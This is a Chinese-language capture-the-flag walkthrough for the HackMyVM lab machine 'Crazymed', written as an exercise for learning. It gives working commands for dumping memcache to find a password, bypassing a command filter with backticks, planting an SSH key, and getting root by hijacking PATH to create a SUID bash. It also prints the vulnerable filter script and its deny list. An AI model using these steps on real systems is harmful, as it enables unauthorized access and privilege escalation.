# Crazymed

2025.02.14 https://hackmyvm.eu/machines/machine.php?vm=Crazymed

[video](https://www.bilibili.com/video/BV1evKAeMExS/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4444/tcp  open  krb524
11211/tcp open  memcache
```

先看看 80 web 服务有什么，底部显示了个 Designed by BootstrapMade 像是个 CMS 的模板，gobuster 扫描后得到 http://192.168.5.40/Readme.txt 但是没什么用，看样子像是个静态网站，在看其他的端口吧。

nc 连接 4444 端口，发现要输入密码，但是目前不知道密码。在链接 11211 的 memcache 看看能不能拿到缓存信息：

```
echo "stats items" | nc -vn -w 1 192.168.5.40 11211          # 发现 items:1
echo "stats cachedump 1 0" | nc -vn -w 1 192.168.5.40 11211  # 得到了缓存的item
echo "get log" | nc -vn -w 1 192.168.5.40 11211              # 这个item中得到了一个提示 password: cr4zyM3d
```

然后利用得到的密码 cr4zyM3d 在 4444 的端口上输入，然后输入 ? 号能看到可以执行的命令，这时输入 id 发现当前用户是 brad，尝试执行其他的命令进行绕过，并且得到了 user flag：

```
System command: echo `ls`
user.txt
System command: echo `cat user.txt`
f70a9801673220fb56f42cf9d5ddc28b
```

将生成的 id_rsa.pub 公钥写入到目标机器上：

```
ssh-keygen -t rsa -f ./id_rsa  # kali上执行

echo `echo 'ssh-rsa ........1MdEG2btvfgk= kali@kali'>>./.ssh/authorized_keys`  # 在目标机器上执行，将上面生成的id_rsa.pub写入到authorized_keys中
```

在 kali 上使用私钥登陆：

```
ssh -i id_rsa brad@192.168.5.40
```

看看那个 4444 端口对应的脚本是怎么限制的，可以看到必须是以 id who echo clear 开头，并且没有限制反单引号，所以存在绕过：

```shell
items=(id who echo clear)
signs=(";" "&" "&&" "|" "$")
export TERM=xterm

printf 'Type "?" for help.\n\n'

while :
do
printf 'System command: '
read -r cmd

for y in "${signs[@]}"; do
[[ $cmd =~ "$y" ]] && echo -e "${BOLDRED}Attack detected.${RESET}" && continue 2
done

for x in "${items[@]}"; do
[[ $cmd =~ "$x" ]] && bash -c "$cmd"
done
```

经过枚举，发现 /usr/local/bin 这个目录任意用户可以写入，并且这个目录是在系统环境变量 PATH 最开始位置。上传 pspy 发现后台有任务执行，/bin/bash /opt/check_VM

```
brad@crazymed:~$ cat /opt/check_VM
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
```

上面发现 chown 这个命令没有写完全路径，可以利用发现的 /usr/local/bin 目录可写，实现命令替换：

```
brad@crazymed:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
brad@crazymed:~$ ls -al /usr/local/bin
total 8
drwxr-xrwx  2 root root 4096 Oct 31  2022 .
drwxr-xr-x 10 root root 4096 Oct 26  2022 ..
brad@crazymed:~$ echo 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash' > /usr/local/bin/chown; chmod +x /usr/local/bin/chown
```

等带 1 分钟，这时会出现 suid 程序/tmp/bash 直接提权到 root：

```
brad@crazymed:~$ /tmp/bash -p
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
b9b38d9533ca00072eff46338bf21b43
```
